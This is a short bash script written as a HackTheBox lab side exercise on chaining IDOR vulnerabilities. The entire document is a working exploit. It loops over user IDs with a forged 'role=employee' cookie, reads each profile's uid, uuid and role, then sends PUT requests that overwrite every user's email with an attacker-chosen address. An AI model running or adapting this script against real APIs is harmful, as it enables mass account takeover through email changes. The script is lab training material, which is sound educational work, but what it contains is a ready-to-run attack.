#!/bin/bash

# HackTheBox module Web Attacks sub-module Chaining IDOR script. Does not complete the module. 
#It is just a side quest challange they asked: "Try to write a script that changes all users' email to an email you choose."

url="http://ip:port" # Change this

for i in {1..10}; do
    # Step 1: Make a GET request to fetch the user data
    response=$(curl -s -X GET "$url/profile/api.php/profile/$i" -H "Cookie: role=employee")
    echo "Original Response: $response"

    # Extract uid, uuid, role, and email from the JSON response
    uid=$(echo "$response" | jq -r '.uid')
    uuid=$(echo "$response" | jq -r '.uuid')
    email=$(echo "$response" | jq -r '.email')
    role2=$(echo "$response" | jq -r '.role')
    echo "UID: $uid, UUID: $uuid, Role: $role2, Email: $email"

    # Step 2: Make a PUT request to update the email using uid, uuid, role, and the Cookie header
    new_email="Cartier1337PwnedUEz@htb.com"
    update_response=$(curl -s -X PUT "$url/profile/api.php/profile/$i" \
        -H "Content-Type: application/json" \
        -H "Cookie: role=employee" \
        -d "{\"uid\":\"$uid\", \"uuid\":\"$uuid\", \"role\":\"$role2\", \"email\":\"$new_email\"}")

    echo "PUT Request Response: $update_response"

    # Step 3: Make another GET request to verify the change, again with the Cookie header
    verify_response=$(curl -s -X GET "$url/profile/api.php/profile/$i" -H "Cookie: role=employee")
    echo "Updated Response: $verify_response"
done
